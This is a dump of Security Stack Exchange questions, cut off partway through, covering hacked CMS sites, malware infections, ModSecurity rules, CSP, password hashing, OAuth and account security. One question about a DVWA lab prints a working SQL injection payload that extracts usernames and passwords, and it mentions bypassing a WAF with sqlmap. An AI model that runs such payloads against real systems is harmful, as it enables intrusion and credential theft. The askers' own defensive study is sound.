<p>What do you think? Is this method secure? Are there any better ways to secure this? Actually, what I'd like to archieve is something like using a master password/key to unencrypt that data, something that the <strong>user</strong> has, but at the same time I can use to unencrypt the data in case my system needs it... For instance, for logging in I've got to compare the password somehow, right? and to unencrypt the public key for display I've got to do it as well.</p>

<p>Any pointers or ideas would be very welcome, as I've spent around two days fully thinking about this issue but I've found no hacker-free way to do so. I know everything is hackable, but I wouldn't mind if it's done somehow that it'll take around 10 GTX 1080s to decrypt the information, that'll give me enough time to act I think. Am I wrong?</p>
","56508","","","","","2018-09-11 21:05:36","Best practices to protect public/private SSH key pair in web interface?","<encryption><hash><password-cracking><account-security><one-time-password>","1","4","","","","CC BY-SA 4.0"
"193610","1","193611","","2018-09-13 03:30:36","","6","4023","<p>Almost all my sites got hacked by cpamatik.com virus</p>

<p>All CMS were up to date, plugins, modules etc..(Drupal and Wordpress) , some sites I have logged in to work on, but some sites I haven't touched in months, so the hack wasn't inadvertendly inserted from me login in.</p>

<p>My PC is scanned and clean, actually reformated 2 weeks ago.</p>

<p>Hack sites behavior is a redirect on home page and links.</p>

<p>Site in question are:</p>

<p>wearelao.com
xuzo.com
easyrconbar.com  and many others...</p>

<p>Security scan on my <strong>Namecheap.com</strong> hosting spitted this out:</p>

<pre><code>----------- SCAN REPORT -----------
TimeStamp: Tue, 11 Sep 2018 14:20:06 -0400
(/usr/sbin/cxs --nobayes --clamdsock /var/clamd --dbreport --defapache nobody --doptions Mv --exploitscan --nofallback --filemax 50000 --noforce --html --ignore /etc/cxs/cxs.ignore.manual --options mMOLfSGchexdnwZDRru --qoptions Mv --report /home/bruneiab/scanreport-bruneiab-Sep_11_2018_14h20m.txt --sizemax 1000000 --ssl --summary --sversionscan --timemax 30 --unofficial --user bruneiab --virusscan --xtra /etc/cxs/cxs.xtra.manual)

Scanning /home/bruneiab:

'/home/bruneiab/access-logs'
# Symlink to [/usr/local/apache/domlogs/bruneiab]

'/home/bruneiab/.nc_plugin/hidden'
# World writeable directory

'/home/bruneiab/.softaculous/installations.php'
# Universal decode regex match = [universal decoder]

'/home/bruneiab/.trash/civicrm/vendor/phpseclib/phpseclib/phpseclib/Net/SFTP.php'
# Regular expression match = [symlink\s*\(]

'/home/bruneiab/.trash/civicrm/vendor/symfony/filesystem/Symfony/Component/Filesystem/Filesystem.php'
# Regular expression match = [symlink\s*\(]   and more...
</code></pre>

<p>Hosting company have been on this for 24 hours, but the can't seem to be able to fix it...</p>

<p><a href=""https://i.stack.imgur.com/dutzc.jpg"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/dutzc.jpg"" alt=""enter image description here""></a></p>
","186510","","","","","2019-05-23 08:37:37","My sites have been hacked by cpamatik.com , it passes all security checks with Google and Sucuri, but still redirects, any idea?","<account-security><web-hosting>","3","2","","2018-09-13 10:10:36","","CC BY-SA 4.0"
"265413","1","","","2022-10-11 00:01:21","","0","258","<p>Yesterday I downloaded a sketchy .exe on my Windows desktop and executed it. A command prompt window appeared then nothing abnormal happened. I tried running MalwareBytes but it didn't display any threats.</p>
<p>Today at 4 am someone tried to log in to my secondary google account, then google detected and disconnected the account. When I woke up 4 hours later I changed the password of my secondary and primary account on my notebook (other device) and wiped the desktop SSD and HD clean with a boot usb and installed Windows once again. Then I downloaded apps such as Firefox, Steam and logged in to my primary and secondary accounts on Firefox.</p>
<p>At 8:30 pm Google once again stopped someone trying to log in my account, this time in the primary. The email I received from google (translated):</p>
<blockquote>
<p>Suspicious activity on your account</p>
<p>Someone could have accessed your Google Account using rogue malware on
one of your devices. The account has been logged out on the device in
question for security reasons.</p>
</blockquote>
<p>I already changed my primary google account password once again.</p>
<p>Is it possible the malware is still alive on my desktop despite deleting and creating again the SSD and HD partitions?</p>
<p>Can someone access my google account ignoring the MFA authentication?</p>
<p>Could it be they still had a session of my primary google account &quot;alive&quot;?</p>
<p>Here is the original message (in portuguese)</p>
<blockquote>
<p>Atividade suspeita na sua conta</p>
<p>Alguém pode ter acessado sua Conta do Google usando um malware nocivo
em um dos seus dispositivos. A conta foi desconectada no dispositivo
em questão por motivos de segurança.</p>
</blockquote>
","283879","","283879","","2022-10-11 12:14:09","2023-07-08 15:03:50","Rogue login to Google account after Windows clean install","<malware><windows><account-security><multi-factor>","1","2","","","","CC BY-SA 4.0"
"265450","1","","","2022-10-12 17:48:18","","1","39","<p>I recently noticed my email address for the University I work for was changed - from &quot;blank@university.edu&quot; to &quot;blank@ad.university.edu&quot;. I also noticed that the version of the email address saved in my browser and on my google account to keep track of my passwords was also changed to this new address. I already called my university's IT department and asked them what this means and they said this is some &quot;backend thing&quot; that I don't have to worry about, but they didn't really have an answer for why the address was autoupdated in my browser and google account, so I was just wondering if this is normal or not.</p>
","283953","","283953","","2022-10-12 17:48:57","2022-10-12 20:06:09","University Email (Outlook) Changed and Auto-Updated in Browser and Google Account","<privacy><email><account-security><google><outlook>","1","0","","","","CC BY-SA 4.0"
"193630","1","","","2018-09-13 09:43:43","","0","281","<p>There are a number of users in the business who are required to perform administrative tasks on machines, not least the IT Service Desk, also Devs etc.</p>

<p>The only requirement for administrative access within our estate would be to install or update software; with most software deployed centrally through SCCM. As such, any requirement would be an IT service desk agent or field technician making ad-hoc changes to a machine, or possibly a developer. There are no requirements for standard users to be local machine administrators.</p>

<p>In the process of creating a reasonable POLP (Principle of least Privilege) policy, we determined that all users should have standard desktop user accounts, and secondary administrative accounts; with the intention being that any requirement to make local changes will be challenged with a UAC, requiring different credentials.</p>

<p>Not only will this stop any malicious processes running in their environment from executing using their account privileges, it also acts as a 'psychological fireguard' to ensure they are being made aware they are making local changes. Additionally, should their standard account be compromised (they have emails, for example), the compromised accounts are not Administrative.</p>

<p><strong>Now, the above seemed logical to me at first glance, but a colleague has since challenged the proposal.</strong></p>

<p>I respect the colleague immensely and he has many, many years of experience in IT; but his challenge was that <strong>his</strong> standard account has Local administrative privileges on <em>his own machine</em>, and that with UAC turned on this should be sufficiently protected.</p>

<h2>Is he Right?</h2>

<p>Some of the users would need their ADM accounts linked to a group that populates local administrators to all machines on the domain; putting their standard accounts into that membership seems like a huge risk to me, but is simply enabling UAC prompts sufficient?</p>
","137564","","137564","","2018-09-16 17:15:55","2018-09-16 17:15:55","Principle of Least privilege; is it ever a 'good idea' to give standard users administrative privileges?","<authentication><account-security><privileged-account><administration>","1","10","","","","CC BY-SA 4.0"
"193705","1","","","2018-09-14 06:35:18","","2","175","<p>I would like to start introducing a CSP on a site. I would like to start by adding a report only CSP and only reporting on mixed content, for example when an images is loading from HTTP instead of HTTPS. </p>

<p>I have tired the three following:</p>

<pre><code>&lt;meta http_equiv=""Content-Security-Policy-Report-Only"" content=""upgrade-insecure-requests; report-uri https://example.report-uri.com/r/d/csp/reportOnly""/&gt;
&lt;meta http_equiv=""Content-Security-Policy-Report-Only"" content=""img-src https:; report-uri https://example.report-uri.com/r/d/csp/reportOnly""&gt;
&lt;meta http_equiv=""Content-Security-Policy-Report-Only"" content=""block-all-mixed-content; report-uri https://example.report-uri.com/r/d/csp/reportOnly""&gt;
</code></pre>

<p>But none of these are reporting the CSP violation to the report-uri URL.</p>

<p>How can I create a CSP to only report content (images) that are loading from HTTP?</p>
","186430","","98538","","2018-09-17 08:23:21","2022-08-31 05:48:27","CSP to report HTTP resources?","<content-security-policy>","2","5","","","","CC BY-SA 4.0"
"265654","1","","","2022-10-20 03:27:17","","0","1016","<p>I have problem when implementing modsecurity and crs. Here is the issue, I hope anyone can give us some guide for resolving this issue.</p>
<p>Apache version :</p>
<blockquote>
<p>Server version: Apache/2.4.29 (Ubuntu) Server built:<br />
2022-06-23T12:51:37</p>
</blockquote>
<p>ModSecurity version :</p>
<blockquote>
<p>modsecurity-2.9.6 (compiled from source)</p>
</blockquote>
<p>Error :</p>
<pre><code>[id &quot;-&quot;][file &quot;/etc/apache2/modsecurity.d/owasp-crs/rules/RESPONSE-951-DATA-LEAKAGES-SQL.conf&quot;][line &quot;92&quot;] - Execution error - PCRE limits exceeded (-8): (null).
[id &quot;-&quot;][file &quot;/etc/apache2/modsecurity.d/owasp-crs/rules/RESPONSE-951-DATA-LEAKAGES-SQL.conf&quot;][line &quot;249&quot;] - Execution error - PCRE limits exceeded (-8): (null).
[id &quot;-&quot;][file &quot;/etc/apache2/modsecurity.d/owasp-crs/rules/RESPONSE-951-DATA-LEAKAGES-SQL.conf&quot;][line &quot;276&quot;] - Execution error - PCRE limits exceeded (-8): (null).
[id &quot;-&quot;][file &quot;/etc/apache2/modsecurity.d/owasp-crs/rules/RESPONSE-951-DATA-LEAKAGES-SQL.conf&quot;][line &quot;329&quot;] - Execution error - PCRE limits exceeded (-8): (null).
[id &quot;-&quot;][file &quot;/etc/apache2/modsecurity.d/owasp-crs/rules/RESPONSE-951-DATA-LEAKAGES-SQL.conf&quot;][line &quot;355&quot;] - Execution error - PCRE limits exceeded (-8): (null).
[id &quot;-&quot;][file &quot;/etc/apache2/modsecurity.d/owasp-crs/rules/RESPONSE-951-DATA-LEAKAGES-SQL.conf&quot;][line &quot;381&quot;] - Execution error - PCRE limits exceeded (-8): (null).
[id &quot;-&quot;][file &quot;/etc/apache2/modsecurity.d/owasp-crs/rules/RESPONSE-951-DATA-LEAKAGES-SQL.conf&quot;][line &quot;407&quot;] - Execution error - PCRE limits exceeded (-8): (null).
[id &quot;-&quot;][file &quot;/etc/apache2/modsecurity.d/owasp-crs/rules/RESPONSE-951-DATA-LEAKAGES-SQL.conf&quot;][line &quot;433&quot;] - Execution error - PCRE limits exceeded (-8): (null).
[id &quot;-&quot;][file &quot;/etc/apache2/modsecurity.d/owasp-crs/rules/RESPONSE-951-DATA-LEAKAGES-SQL.conf&quot;][line &quot;459&quot;]
</code></pre>
<p>Thing What I have done :</p>
<p>Set this value (tested before or after load crs.conf):</p>
<pre><code> SecPcreMatchLimit 5000000 
 SecPcreMatchLimitRecursion 5000000
</code></pre>
<p>Add in php.ini</p>
<pre><code>pcre.backtrack_limit=1000000
pcre.recursion_limit=1000000
</code></pre>
<p>restart php-fpm and apache2</p>
<p>And no luck!, the issue still persist.</p>
<p>Any ideas how to fix this.</p>
<p>Thank you.</p>
","281467","","281467","","2022-10-20 08:36:39","2022-10-20 08:36:39","Execution error - PCRE limits exceeded","<owasp><mod-security>","1","0","","","","CC BY-SA 4.0"
"265669","1","","","2022-10-20 10:42:02","","2","46","<p>I have a laptop with an Office 365 company account. I work from home, but I obviously have some company policies running, since I get the <em>'Your administrator has blocked this action'</em> messages in my Protection History.</p>
<p>Once in a while, I install software from Github on a second <strong>personal account</strong> on the same laptop. Somehow, the policies from my work account are still active on my personal account, because I get the same 'blocked' warnings.</p>
<p><strong>The question is:</strong> if I override the block, by clicking <em>&quot;Allow it&quot;</em> - will my company be able to see this in a security report or a log file? In short, are they watching what I do - security wise?</p>
","284316","","","","","2022-10-20 11:26:10","Is the Windows Security Protection History shared with my employer if I'm logged in on a work laptop?","<windows><account-security>","1","1","","","","CC BY-SA 4.0"
"53573","1","53637","","2014-03-18 03:24:27","","2","12458","<p>I am trying to perform a simple penetration test on the DVWA (the web application that has been specifically designed to be vulnerable to some of the most common web application attacks).</p>

<p>I want to use ModSecurity WAF to protect this web application from SQL Injection attacks. I am using Apache web server to host my web application. The operating system of this ‘victim’ virtual machine is Windows XP SP3.</p>

<p>I know ModSecurity provides very little protection on its own. So I decided to use OWASP ModSecurity Core Rule Set Project to include additional SQL Injection rules.</p>

<p>I copied ‘SQL Injection Attacks rules’ provided in the ‘base_rules’ folder of the OWASP Core Rule Set to the appropriate config file, and made sure these rules were loaded together with ModSecurity itself. </p>

<p>I performed manual SQL Injection attacks on the DVWA from my other virtual machine that had Kali Linux installed. For example:</p>

<pre><code>%’ or 1=0 union select null, concat (first_name, 0x0a, last_name, 0x0a, user, 0x0a, password) from users #
</code></pre>

<p>When SQL Injection Core Rule Set was disabled, the following information would be displayed:</p>

<p><img src=""https://i.stack.imgur.com/ArPe8.png"" alt=""enter image description here""></p>

<p>However, when these rules were enabled, the server would always return ‘Error 403 – Access forbidden’ meaning that these SQL Injection rules were working correctly.</p>

<p>I then decided to use sqlmap to perform more advanced SQL Injection attacks. I had to hijack the session by using burp suite in order to obtain cookie information. I copied all that information to a .txt file on Kali Linux Virtual machine:</p>

<p><img src=""https://i.stack.imgur.com/UPnR4.png"" alt=""enter image description here""></p>

<p>I hid the IP and cookie information.</p>

<p>This is the command that I entered in my Kali Linux virtual machine terminal:</p>

<p><img src=""https://i.stack.imgur.com/WU0Mk.png"" alt=""enter image description here""></p>

<p>Sqlmap managed to bypass the OWASP ModSecurity SQL Injection rules and displayed the following information:</p>

<p><img src=""https://i.stack.imgur.com/N5niO.png"" alt=""enter image description here""></p>

<p>I really don’t understand why it managed to bypass these rules. Any ideas? </p>

<p>I used the following tutorial to configure ModSecurity on my virtual machine:</p>

<p><a href=""http://mewbies.com/how_to_install_mod_security_for_apache_tutorial.htm"" rel=""nofollow noreferrer"">http://mewbies.com/how_to_install_mod_security_for_apache_tutorial.htm</a></p>

<p>Maybe I should have included some additional OWASP Rule sets to prevent sqlmap attack?</p>

<p>Thank you</p>
","42193","","42193","","2014-03-18 21:35:37","2015-09-02 15:55:37","SqlMap bypasses OWASP ModSecurity Core Rule Set for SQL Injection","<web-application><sql-injection><apache><owasp><mod-security>","2","7","","","","CC BY-SA 3.0"
"53594","1","143857","","2014-03-18 10:18:54","","106","73684","<p>There are very few websites that hash the users password before submitting it to the server. Javascript doesn't even have support for SHA or other algorithms.</p>

<p>But I can think of quite a few advantages, like protection against cross-site leaks or malicious admins, which SSL does not provide.</p>

<p>So why is this practise so uncommon among websites?</p>
","24542","","24542","","2017-08-10 05:25:05","2023-08-05 10:43:05","Why is client-side hashing of a password so uncommon?","<authentication><passwords><hash><password-cracking><account-security>","13","8","","","","CC BY-SA 3.0"
"265771","1","265773","","2022-10-24 13:41:41","","0","152","<p>My typical cloud server hardening includes blocking ports at the UFW level on the server as well as at the AWS security group level.</p>
<p>I recently learned that Docker <a href=""https://docs.docker.com/network/iptables/"" rel=""nofollow noreferrer"">overwrites your IPTables</a>. Given that, I had previously blocked a port <code>x</code> with UFW, but also published port <code>x</code> with Docker, which I believe negates my UFW status.</p>
<p>Did my AWS security group settings still block this port <code>x</code> from being exposed to the world?</p>
","283315","","41093","","2022-10-24 18:13:04","2022-10-24 18:13:04","Does AWS security group block unintentionally exposed ports from Docker?","<account-security><ports><aws><docker>","2","0","","","","CC BY-SA 4.0"
"265814","1","","","2022-10-25 17:50:01","","1","241","<h2>Goal</h2>
I'd like to have multiple independent websites with one shared authentication server. The auth server will have one database in which all users are stored (just username, email and password, so different data models are of no concern). User 1 from website A should only be able to log-in at A.com, while user 2 from website B should only be able to log-in at B.com. <br><br>
<h2>Question</h2>
Would it be SAFE to store the url of the website with the user record, which is the only website they should be granted access to? So for example:
<pre><code>{
   username: a,
   email: a@myspace.com
   password: ****
   website: A.com
}, 
{
   username: b,
   email: b@myspace.com
   password: ****
   website: B.com
}
</code></pre>
<h2>Why this approach</h2>
Correct me if I'm wrong, but otherwise I'd have to host a seperate database, cache and server for each website with a log-in. 
","279066","","","","","2023-07-23 16:07:30","Using one server and user database for multiple websites","<authentication><databases><account-security>","2","0","","","","CC BY-SA 4.0"
"194060","1","","","2018-09-19 09:58:13","","0","1297","<p>I have a web-server running a Perl site, and I have a WAF (ModSecurity) running. The website has a form. When submitted the request contain HTML tags like so: </p>

<pre><code>&lt;br+/&gt;
&lt;div+style=""border:none;+border-left:solid+blue+1.5pt;+padding:0cm+0cm+0cm+4.0pt""+type=""cite""&gt;
&lt;div+style=""font-family:arial,helvetica,sans-serif;+font-size:12pt;+color:#000000""&gt;
&lt;div&gt;Ahoy&lt;/div&gt;
&lt;div&gt;&amp;nbsp;&lt;/div&gt;
&lt;div&gt;
&lt;div&gt;&lt;span+style=""color:#333333""&gt;TEST Test,&lt;/span&gt;&lt;/div&gt;   
&lt;div&gt;&lt;span+style=""color:#008000""&gt;4950&lt;/span&gt;&lt;/div&gt;
</code></pre>

<p>How can I pass these tags without triggering ModSecurity and the request getting blocked?</p>
","160555","","98538","","2018-09-19 10:04:14","2019-08-15 18:03:55","Allow ModSecurity to pass specific HTML tags?","<html><mod-security><perl>","1","3","","","","CC BY-SA 4.0"
"194108","1","194112","","2018-09-19 23:17:40","","4","5595","<p>I noticed some websites do this and I am not sure if this is normal or not. So for example, on some websites, I go into setting and can create an API key that will be visible in plain text. Also, seems like a lot of HTTP requests have an API key visible in the URL. Something like this <code>""https://www.myWebsite/user?apiKey=\(apiKey)""</code>. Any insight on this is appreciated.</p>
","166497","","166497","","2018-09-20 00:01:28","2020-06-27 04:19:22","Is it normal for a website to show an API key in plain text that allows full access to your personal information?","<account-security><api>","4","0","","","","CC BY-SA 4.0"
"266025","1","","","2022-11-02 16:10:13","","1","63","<p>I have a old Spring Cloud gateway working with Keyclock server. I don't have Web UI for login because the project is a Rest API. OAuth 2.0 is used with <code>Grant type</code> <code>password</code>.</p>
<p>I want to migrate to OAuth 2.1 but <code>Grant type</code> <code>password</code> is deprecated.</p>
<p>Can you advise in my case what would be the best way to migrate the project in order again to have user name and password to issue a token in order to authenticate users and make API requests?</p>
<p>Looking at this guide <a href=""https://connect2id.com/learn/oauth-2-1"" rel=""nofollow noreferrer"">https://connect2id.com/learn/oauth-2-1</a> I think <code>JWT bearer</code> grant type is a good candidate?</p>
<p>What if I create my own grant type similar to <code>password</code> <code>grant type</code>?</p>
","195339","","","","","2022-11-02 16:10:13","Migrate OAuth 2.0 to OAuth 2.1","<account-security><oauth2><spring-framework><api-gateway>","0","0","","","","CC BY-SA 4.0"
"128771","1","","","2016-06-30 12:04:36","","3","596","<p>To quote <a href=""https://travel.stackexchange.com/a/72476/2928"">https://travel.stackexchange.com/a/72476/2928</a></p>

<blockquote>
  <p>I entered the last four digits of my SSN and provided basic DOB and full name. Then it asked me three security questions that only I would know the answers to. For example, it asked where I was in 1989-1990 and it asked where something was.</p>
  
  <p>From <a href=""https://pando.com/2015/09/09/welcome-airbnb-you-can-check-out-any-time-your-data-can-never-leave/"" rel=""nofollow noreferrer"">this article</a> airbnb is using an identity verification service from a company called <a href=""https://www.idology.com/"" rel=""nofollow noreferrer"">IDology</a>. This company provides a <a href=""https://www.idology.com/identity-verification-solutions/knowledge-based-authentication/dynamic-kba/"" rel=""nofollow noreferrer"">service</a> to verify your identity:</p>
  
  <blockquote>
    <p>Derived from information in public data records, ExpectID IQ serves up
    non-intrusive, intelligent questions relating to that person’s history
    such as something involving a previous address or an associated
    person.</p>
  </blockquote>
</blockquote>

<p>How secure is that? I imagine a resourceful attacker could answer anyone's verification questions, either by researching the public records herself, or subscribing to IDology and requesting question-answer sets on the target until the same question came up.</p>
","9374","","-1","","2017-04-13 12:52:14","2020-01-08 10:20:35","How secure is IDology's ExpectID (as used on airbnb)?","<authentication><account-security>","1","0","","","","CC BY-SA 3.0"
"194142","1","194279","","2018-09-20 12:15:17","","40","13776","<p>I'm using 1password and I've seen 1password allows you to store 2FA tokens in the same place where you store the password.</p>

<p>I don't like the idea of having everything in the same place as if someone steal my 1password password it could access to my account and get both password and security tokens. Actually, I'm using the Google Auth for the 2FA and 1password for the passwords.</p>

<p>Is a good idea to keep them separated to increase security? Does it make any sense?</p>
","121284","","98538","","2018-09-20 12:25:18","2022-01-26 11:53:58","Is it safe to store 2FA tokens together with passwords in 1password?","<passwords><multi-factor><account-security>","6","1","","2021-10-08 06:40:21","","CC BY-SA 4.0"
"194477","1","","","2018-09-26 03:57:29","","-1","552","<p>My boyfriend thinks a Snapchat account is mine when it isn’t. Is there anyway I can prove this is not true if the owner of the account won’t message me back? </p>
","187454","","","","","2018-09-26 06:03:52","Is there anyway I can prove a snap account isn’t mine","<account-security>","1","1","","","","CC BY-SA 4.0"
"266243","1","","","2022-11-10 03:02:14","","0","73","<p>Let's say I am an organization with all my resources on <strong>example.com</strong>. I have a web server in the DMZ that hosts a website named <strong>app.example.com</strong> open to the internet.</p>
<p>The CSP for that website is <code>Content-Security-Policy: default-src 'self' https://*.example.com</code></p>
<p>All internal servers are also on the same domain <strong>example.com</strong>. For example: internal website <strong>corporate.example.com</strong> hosts a community for internal employees. This service is internal and cannot be accessed publicly. However, it is accessible by <strong>app.example.com</strong> through https- there are no firewall rules preventing https traffic between the two.</p>
<p>Let's assume a threat actor comes to know that there is an internal web service named <strong>corporate.example.com</strong>.Can the threat actor then inject code on <strong>app.example.com</strong> to indirectly access images from <strong>corporate.example.com</strong>? For example:</p>
<pre><code>&lt;img src=&quot;https://corporate.example.com/profilepicture.jpg&quot;&gt;
</code></pre>
<p>The example in this case is an image but could they access any resource including scripts and other objects hosted on the internal server through this method of injection? Perhaps this is not possible and I'm missing something very foundational.</p>
<p>If this is possible, what are some ways to prevent such a vulnerability?</p>
","285318","","37315","","2022-11-10 06:06:02","2023-04-09 07:01:50","How secure is using https://*.domain.com as a value in a Content Security Policy?","<xss><injection><content-security-policy>","1","2","","","","CC BY-SA 4.0"
"266284","1","266359","","2022-11-11 04:16:10","","1","324","<pre><code>ModSecurity 3.0.8
ModSecurity-Nginx 1.0.3
CRS 4.0.0-rc1
</code></pre>
<p>I have a marketplace where sellers can list anything for sale. On the &quot;item description&quot; section, we allow users to copy and paste their HTML formatting, like eBay does. We have a lot of sellers who need this feature.</p>
<p>However, when the seller submits their listing, ModSecurity is complaining about seeing the inserted HTML. Temporarily, I have a DetectionOnly exclusion set on /sell/step3.php while I study the false positives, as users complained of their listings being blocked by ModSecurity.</p>
<p>Here is the most recent listing of a guy selling a collectible stamp for sale, with their standard HTML formatting that they use on all their listings:</p>
<pre><code>---LoANlvlP---A--
[10/Nov/2022:20:23:51 +0000] 166811183185.848525 75.167.8.128 58252 ***.***.***.*** 443
---LoANlvlP---B--
POST /sell/step3.php HTTP/2.0
user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.35
sec-fetch-site: same-origin
content-type: application/x-www-form-urlencoded
origin: https://www.************.com
sec-ch-ua-mobile: ?0
upgrade-insecure-requests: 1
accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
cache-control: max-age=0
sec-ch-ua: &quot;Microsoft Edge&quot;;v=&quot;107&quot;, &quot;Chromium&quot;;v=&quot;107&quot;, &quot;Not=A?Brand&quot;;v=&quot;24&quot;
sec-fetch-user: ?1
sec-ch-ua-platform: &quot;Windows&quot;
referer: https://www.************.com/
content-length: 6271
host: www.************.com
sec-fetch-mode: navigate
sec-fetch-dest: document
accept-encoding: gzip, deflate, br
cookie: _aa_main_00923540=923540x7315x44x341817x7277x230; _ga=GA1.2.509941997.1668106789; _gid=GA1.2.2055781097.1668106789; NEWSESSID=o1jk1fpjddvt829dg1oo8i5dqu; __gads=ID=bfd0ad5ec87da1d6-22ebbb97d1d6008d:T=1668109602:RT=1668109602:S=ALNI_MZfPaQ_kbhubJdI9wnm4JICM_AkZw; __gpi=UID=000008f55343334c:T=1668109602:RT=1668109602:S=ALNI_MaTsFE-sox5uuzpkvE3st8YLXG7Og
accept-language: en-US,en;q=0.9
    
---LoANlvlP---F--
HTTP/2.0 200

---LoANlvlP---C--
newitemid=2128489-*****&amp;catid1=20738&amp;catid2=&amp;storecatid=&amp;itemimagesid=2128489-*****&amp;itemtype=new&amp;oldtitle=German+Used+Scott+%23B170+Catalog+Value+%246.00&amp;title=German+Used+Scott+%23B138+Catalog+Value+%243.00&amp;subtitle=&amp;description=%3Cp%3E%3Cspan+style%3D%22font-size%3A28px%3B%22%3E%3Cspan+style%3D%22color%3Argb%28255%2C0%2C0%29%3B%22%3E%3Cstrong%3EGermany+Scott+%23B138+Used%3C%2Fstrong%3E%26nbsp%3B%3C%2Fspan%3E%3C%2Fspan%3E%3C%2Fp%3E%0D%0A%0D%0A%3Cp%3E%3Cspan+style%3D%22font-size%3A22px%3B%22%3E%3Cspan+style%3D%22color%3A%230000CD%3B%22%3E%3Cstrong%3EScott+2023%26nbsp%3BCatalog+Value+%243.00%3C%2Fstrong%3E%3C%2Fspan%3E%3C%2Fspan%3E%3C%2Fp%3E%0D%0A%0D%0A%3Cp+style%3D%22margin%3A0px+0px+10px%3Bcolor%3Argb%2851%2C51%2C51%29%3Bfont-family%3AHelvetica%2C+Arial%2C+sans-serif%3Bfont-size%3A14px%3Bfont-style%3Anormal%3Bfont-weight%3A400%3Bletter-spacing%3Anormal%3Btext-indent%3A0px%3Btext-transform%3Anone%3Bwhite-space%3Anormal%3Bword-spacing%3A0px%3Bbackground-color%3Argb%28255%2C255%2C255%29%3B%22%3E%3Cspan+style%3D%22color%3Argb%28255%2C0%2C0%29%3B%22%3E%3Cspan+style%3D%22font-size%3A20px%3B%22%3E%3Cspan+style%3D%22font-weight%3A700%3B%22%3EMultiple+Buyers+pay+shipping+only+once.%3C%2Fspan%3E%3C%2Fspan%3E%3C%2Fspan%3E%3C%2Fp%3E%0D%0A%0D%0A%3Cdiv+style%3D%22color%3Argb%2851%2C51%2C51%29%3Bfont-family%3AHelvetica%2C+Arial%2C+sans-serif%3Bfont-size%3A14px%3Bfont-style%3Anormal%3Bfont-weight%3A400%3Bletter-spacing%3Anormal%3Btext-indent%3A0px%3Btext-transform%3Anone%3Bwhite-space%3Anormal%3Bword-spacing%3A0px%3Btext-align%3Aleft%3Bbackground-color%3Argb%28255%2C255%2C255%29%3B%22%3E%0D%0A%3Cdiv%3E%0D%0A%3Cdiv%3E%0D%0A%3Ch2+style%3D%22font-family%3Ainherit%3Bfont-weight%3A500%3Bline-height%3A1.1%3Bcolor%3Ainherit%3Bmargin-top%3A20px%3Bmargin-bottom%3A10px%3Bfont-size%3A30px%3B%22%3E%3Ca+style%3D%22background-color%3Atransparent%3Bcolor%3Argb%2851%2C122%2C183%29%3Btext-decoration%3Anone%3B%22%3E%3Cspan+style%3D%22color%3Argb%280%2C0%2C205%29%3B%22%3E%3Cspan+style%3D%22font-weight%3A700%3B%22%3E%3Cspan+style%3D%22border-width%3A0in%3Bmargin%3A0px%3Bpadding%3A0in%3Bfont-family%3AHelvetica%3Bfont-size%3A20pt%3B%22%3EShipping+For+all+stamps+purchased+.75+USA+1.75+World+Wide%3C%2Fspan%3E%3C%2Fspan%3E%3C%2Fspan%3E%3C%2Fa%3E%3C%2Fh2%3E%0D%0A%3C%2Fdiv%3E%0D%0A%0D%0A%3Cp+style%3D%22margin%3A0px+0px+10px%3B%22%3E%3Cspan+style%3D%22color%3Argb%28255%2C0%2C0%29%3B%22%3E%3Cspan+style%3D%22font-size%3A24px%3B%22%3E%3Cspan+style%3D%22font-weight%3A700%3B%22%3EPayPal+Only+if+total+price+is+over+%2410.00+stamps+May+be+combined+to+reach+this+figure.%3C%2Fspan%3E%3C%2Fspan%3E%3C%2Fspan%3E%26nbsp%3B%3Cspan+style%3D%22font-weight%3A700%3B%22%3E%28.60+Charge+if+under+%2410.00%29%3C%2Fspan%3E%3Cspan+style%3D%22color%3Argb%280%2C0%2C128%29%3B%22%3E%3Cspan+style%3D%22font-size%3A20px%3B%22%3E%26nbsp%3B%3C%2Fspan%3E%3C%2Fspan%3E%3C%2Fp%3E%0D%0A%3C%2Fdiv%3E%0D%0A%0D%0A%3Cp+style%3D%22margin%3A0px+0px+10px%3B%22%3E%3Cspan+style%3D%22font-size%3A20px%3B%22%3E%3Cspan+style%3D%22font-weight%3A700%3B%22%3E%3Cspan+style%3D%22color%3Argb%280%2C0%2C205%29%3B%22%3EForeign+Buyers+can+pay+in+new+issue+stamps+from+their+country+at+exchange+rates+listed+in%3C%2Fspan%3E%3Cspan+style%3D%22color%3Argb%28128%2C0%2C128%29%3B%22%3E%26nbsp%3B%3C%2Fspan%3E%3Ca+href%3D%22http%3A%2F%2Fwww.xe.com%2F%22+rel%3D%22nofollow+noreferrer+noopener%22+style%3D%22background-color%3Atransparent%3Bcolor%3Argb%2851%2C122%2C183%29%3Btext-decoration%3Anone%3B%22+target%3D%22_blank%22%3E%3Cspan+style%3D%22color%3Argb%28128%2C0%2C128%29%3B%22%3Ehttp%3A%2F%2Fwww.xe.com%2F%3C%2Fspan%3E%3C%2Fa%3E%3C%2Fspan%3E%3Cspan+style%3D%22color%3Argb%28128%2C0%2C128%29%3B%22%3E%26nbsp%3B%3C%2Fspan%3E%3C%2Fspan%3E%3C%2Fp%3E%0D%0A%0D%0A%3Cp+style%3D%22margin%3A0px+0px+10px%3B%22%3E%3Cspan+style%3D%22color%3Argb%28255%2C0%2C0%29%3B%22%3E%3Cspan+style%3D%22font-size%3A20px%3B%22%3E%3Cspan+style%3D%22font-weight%3A700%3B%22%3EAll+lots+are+100%25+guaranteed.+Money+refunded+unless+negative+feed+back+is+left+before+I+have+a+chance+to+make+it+right%3C%2Fspan%3E%3C%2Fspan%3E%3C%2Fspan%3E%3Cspan+style%3D%22color%3Argb%28128%2C0%2C128%29%3B%22%3E%3Cspan+style%3D%22font-size%3A20px%3B%22%3E%3Cspan+style%3D%22font-weight%3A700%3B%22%3E.%3C%2Fspan%3E%26nbsp%3B%3C%2Fspan%3E%3C%2Fspan%3E%3C%2Fp%3E%0D%0A%0D%0A%3Cp+style%3D%22margin%3A0px+0px+10px%3B%22%3E%3Cspan+style%3D%22color%3Argb%280%2C0%2C205%29%3B%22%3E%3Cspan+style%3D%22font-size%3A20px%3B%22%3E%3Cspan+style%3D%22font-weight%3A700%3B%22%3EChecks+Accepted+only+on+US+Banks%3C%2Fspan%3E%3C%2Fspan%3E%3C%2Fspan%3E%3C%2Fp%3E%0D%0A%0D%0A%3Cp+style%3D%22margin%3A0px+0